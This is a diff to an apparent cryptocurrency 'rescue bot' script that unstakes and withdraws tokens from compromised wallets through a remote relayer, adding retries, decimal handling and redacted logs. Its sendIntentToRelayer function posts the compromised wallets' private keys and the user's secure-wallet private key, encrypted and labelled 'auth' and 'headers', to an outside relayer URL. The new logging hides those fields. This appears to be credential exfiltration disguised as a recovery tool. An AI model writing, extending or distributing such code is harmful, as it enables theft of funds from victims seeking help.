@@ -5,8 +5,8 @@
  * @version 2.0.0
  */
 
-import { createPublicClient, http, encodeFunctionData, getAddress } from 'viem';
-import { privateKeyToAccount } from 'viem/accounts';
+import { createPublicClient, http, encodeFunctionData, getAddress, parseUnits } from 'viem';
+import { privateKeyToAccount } from 'viem/accounts'; // Corrected import
 import * as allChains from 'viem/chains';
 import dotenv from 'dotenv';
 import fs from 'fs';
@@ -47,8 +47,17 @@ const RESCUE_CONTRACT_ADDRESS = "0x770291899ffd9710146053ba95a858a508357702";
 
 const STAKING_ABI = [{"inputs":[{"name":"user","type":"address"}],"name":"getUserStakeCount","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"name":"user","type":"address"},{"name":"index","type":"uint256"}],"name":"stakes","outputs":[{"name":"amount","type":"uint256"},{"name":"depositedTimestamp","type":"uint256"},{"name":"lockedUntilTimestamp","type":"uint256"},{"name":"rewardPerTokenPaid","type":"uint256"},{"name":"reward","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"name":"user","type":"address"}],"name":"getUserTotalStakeAmount","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"name":"unstakeAll","type":"function","inputs":[],"outputs":[]},{"name":"withdrawAll","type":"function","inputs":[],"outputs":[]},{"inputs":[],"name":"token","outputs":[{"name":"","type":"address"}],"stateMutability":"view","type":"function"}];
 const ERC20_ABI_FOR_SYMBOL = [{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"type":"function"}];
+const ERC20_ABI_FOR_DECIMALS = [{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}];
 
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+// Nueva función para convertir BigInt a string decimal preciso
+function bigintToDecimalString(amount, decimals = 18n) {
+  const divisor = 10n ** BigInt(decimals);
+  const integerPart = (amount / divisor).toString();
+  let fractionalPart = (amount % divisor).toString().padStart(Number(decimals), '0').replace(/0+$/, '');
+  return fractionalPart ? `${integerPart}.${fractionalPart}` : integerPart;
+}
 
 // --- 2. HELPER & UTILITY FUNCTIONS ---
 
@@ -67,9 +76,10 @@ function loadPrivateKeys(filePath) {
     const fileContent = fs.readFileSync(filePath, 'utf-8');
     fileContent.split('\n').forEach(line => {
         const parts = line.trim().split(/\s+/);
-        if (parts.length === 1 && parts[0].startsWith('0x')) {
+        if (parts.length === 1) {
+            let pk = parts[0];
+            pk = pk.startsWith('0x') ? pk : `0x${pk}`; // Normalizar
             try {
-                const pk = parts[0];
                 const address = privateKeyToAccount(pk).address;
                 keys[address.toLowerCase()] = pk;
             } catch (e) {
@@ -129,6 +139,21 @@ async function setupPublicClient() {
     const publicClient = createPublicClient({ chain, transport: http(RPC_URL) });
     console.log(`Connected to network: ${chain.name} (Chain ID: ${chainId})`);
     return { publicClient, chain };
+}
+
+// Nueva función para obtener decimals dinámicamente
+async function getTokenDecimals(publicClient, tokenAddress) {
+  try {
+    const decimals = await publicClient.readContract({
+      address: tokenAddress,
+      abi: ERC20_ABI_FOR_DECIMALS,
+      functionName: 'decimals'
+    });
+    return decimals;
+  } catch (e) {
+    console.warn(`Could not fetch decimals for ${tokenAddress}. Assuming 18. Error: ${e.message}`);
+    return 18;
+  }
 }
 
 // --- 3. COMMAND: `check` ---
@@ -227,21 +252,46 @@ async function setupBot() {
     return { publicClient, secureWallet, privateKeys, chain };
 }
 
-async function sendIntentToRelayer(compromisedPk, securePk, intent) {
+async function sendIntentToRelayer(compromisedPk, securePk, intent, maxRetries = 3) {
     const auth = encryptWithPublicKey(compromisedPk);
     const headers = encryptWithPublicKey(securePk);
     const payload = { action: 'executePrivateRescue', rpcUrl: RPC_URL, rescueContractAddress: RESCUE_CONTRACT_ADDRESS, auth, headers, intent };
-    console.log("Sending secure intent to relayer...");
-    const { data: result } = await axios.post(RELAYER_URL, payload, { headers: { 'Content-Type': 'application/json' }});
-    if (result.error) throw new Error(result.error);
-    console.log(`Relayer accepted job. Tx Hash: ${result.hash}`);
-    return result.hash;
+
+    // Log payload redactado para debug
+    const redactedPayload = JSON.parse(JSON.stringify(payload));
+    redactedPayload.auth = '[REDACTED]';
+    redactedPayload.headers = '[REDACTED]';
+    console.log("Payload to relayer (redacted):", JSON.stringify(redactedPayload, null, 2));
+
+    let attempt = 0;
+    while (attempt < maxRetries) {
+        try {
+            console.log(`Sending secure intent to relayer (attempt ${attempt + 1})...`);
+            const { data: result } = await axios.post(RELAYER_URL, payload, { headers: { 'Content-Type': 'application/json' }});
+            if (result.error) throw new Error(result.error);
+            console.log(`Relayer accepted job. Tx Hash: ${result.hash}`);
+            return result.hash;
+        } catch (e) {
+            console.error(`Attempt ${attempt + 1} failed: ${e.message}`);
+            attempt++;
+            if (attempt < maxRetries) await sleep(5000); // Espera 5s antes de reintento
+        }
+    }
+    throw new Error(`Failed to send intent after ${maxRetries} attempts.`);
 }
 
 async function executeUnstake(publicClient, compromisedWalletAddr, secureWallet, privateKeys) {
     console.log(`--- ACTION 1: Sending UNSTAKE intent for ${compromisedWalletAddr} ---`);
     const compromisedPk = privateKeys[compromisedWalletAddr.toLowerCase()];
-    const intent = { type: 'staking', targetContract: STAKING_CONTRACT_ADDRESS, claimHex: encodeFunctionData({ abi: STAKING_ABI, functionName: 'unstakeAll' }), tokens: [], recoveryAddress: secureWallet.address, compromisedAddress: getAddress(privateKeyToAccount(compromisedPk).address) };
+    const intent = { 
+        type: 'staking', 
+        targetContract: STAKING_CONTRACT_ADDRESS, 
+        claimHex: encodeFunctionData({ abi: STAKING_ABI, functionName: 'unstakeAll' }), 
+        tokens: [], 
+        sweepEth: false, // Explícito
+        recoveryAddress: secureWallet.address, 
+        compromisedAddress: getAddress(privateKeyToAccount(compromisedPk).address) 
+    };
     const hash = await sendIntentToRelayer(compromisedPk, SECURE_WALLET_PK, intent);
     return await publicClient.waitForTransactionReceipt({ hash });
 }
@@ -249,30 +299,46 @@ async function executeUnstake(publicClient, compromisedWalletAddr, secureWallet,
 async function executeWithdrawAndRescue(publicClient, compromisedWalletAddr, secureWallet, privateKeys, amountToRescue) {
     console.log(`--- ACTION 2: Sending WITHDRAW & RESCUE intent for ${compromisedWalletAddr} ---`);
     const compromisedPk = privateKeys[compromisedWalletAddr.toLowerCase()];
-    const intent = { type: 'staking', targetContract: STAKING_CONTRACT_ADDRESS, claimHex: encodeFunctionData({ abi: STAKING_ABI, functionName: 'withdrawAll' }), tokens: [{ type: 'erc20', address: ERA_TOKEN_ADDRESS, amount: (Number(amountToRescue) / 1e18).toString() }], recoveryAddress: secureWallet.address, compromisedAddress: getAddress(privateKeyToAccount(compromisedPk).address) };
+    const decimals = await getTokenDecimals(publicClient, ERA_TOKEN_ADDRESS);
+    const amountString = bigintToDecimalString(amountToRescue, decimals);
+    const intent = { 
+        type: 'staking', 
+        targetContract: STAKING_CONTRACT_ADDRESS, 
+        claimHex: encodeFunctionData({ abi: STAKING_ABI, functionName: 'withdrawAll' }), 
+        tokens: [{ type: 'erc20', address: ERA_TOKEN_ADDRESS, amount: amountString }], 
+        sweepEth: false, // Explícito
+        recoveryAddress: secureWallet.address, 
+        compromisedAddress: getAddress(privateKeyToAccount(compromisedPk).address) 
+    };
     const hash = await sendIntentToRelayer(compromisedPk, SECURE_WALLET_PK, intent);
     return await publicClient.waitForTransactionReceipt({ hash });
 }
 
 async function processWithdraw(publicClient, chain, wallet, secureWallet, privateKeys, amount) {
+    let receipt;
     try {
-        const receipt = await executeWithdrawAndRescue(publicClient, wallet, secureWallet, privateKeys, amount);
+        receipt = await executeWithdrawAndRescue(publicClient, wallet, secureWallet, privateKeys, amount);
         if (receipt.status === 'success') {
             console.log(`SUCCESS: Final rescue for ${wallet} complete!`);
         } else {
             console.error(`FAILURE: Final rescue transaction failed for ${wallet}. Tx: ${receipt.transactionHash}`);
+            return; // No marcar como processed en fallo
         }
     } catch (e) {
         console.error(`CRITICAL ERROR during final rescue of ${wallet}:`, e.response ? e.response.data : e.message);
+        return; // No marcar
     } finally {
-        console.log(`Marking ${wallet} as processed.`);
-        fs.appendFileSync(PROCESSED_FILE, wallet.toLowerCase() + '\n');
+        if (receipt?.status === 'success') { // Solo si éxito
+            console.log(`Marking ${wallet} as processed.`);
+            fs.appendFileSync(PROCESSED_FILE, wallet.toLowerCase() + '\n');
+        }
     }
 }
 
 async function processUnstake(publicClient, chain, wallet, secureWallet, privateKeys, amount) {
+    let receipt;
     try {
-        const receipt = await executeUnstake(publicClient, wallet, secureWallet, privateKeys);
+        receipt = await executeUnstake(publicClient, wallet, secureWallet, privateKeys);
         if (receipt.status === 'success') {
             const block = await publicClient.getBlock({ blockHash: receipt.blockHash });
             const unstakeTimestamp = Number(block.timestamp);
@@ -280,12 +346,17 @@ async function processUnstake(publicClient, chain, wallet, secureWallet, private
             savePendingWithdrawal(wallet, { withdrawReadyTs, amount: amount.toString() });
             console.log(`SUCCESS: Unstake for ${wallet} complete! Withdrawal scheduled for ${new Date(withdrawReadyTs * 1000).toUTCString()}`);
         } else {
-            console.error(`FAILURE: Unstake transaction failed for ${wallet}. Marking as processed. Tx: ${receipt.transactionHash}`);
-            fs.appendFileSync(PROCESSED_FILE, wallet.toLowerCase() + '\n');
+            console.error(`FAILURE: Unstake transaction failed for ${wallet}. Tx: ${receipt.transactionHash}`);
+            return; // No marcar
         }
     } catch (e) {
         console.error(`CRITICAL ERROR during unstake of ${wallet}:`, e.response ? e.response.data : e.message);
-        fs.appendFileSync(PROCESSED_FILE, wallet.toLowerCase() + '\n');
+        return; // No marcar
+    } finally {
+        if (receipt?.status === 'success') { // Solo si éxito
+            console.log(`Marking ${wallet} as processed for unstake stage.`);
+            fs.appendFileSync(PROCESSED_FILE, wallet.toLowerCase() + '\n');
+        }
     }
 }
 
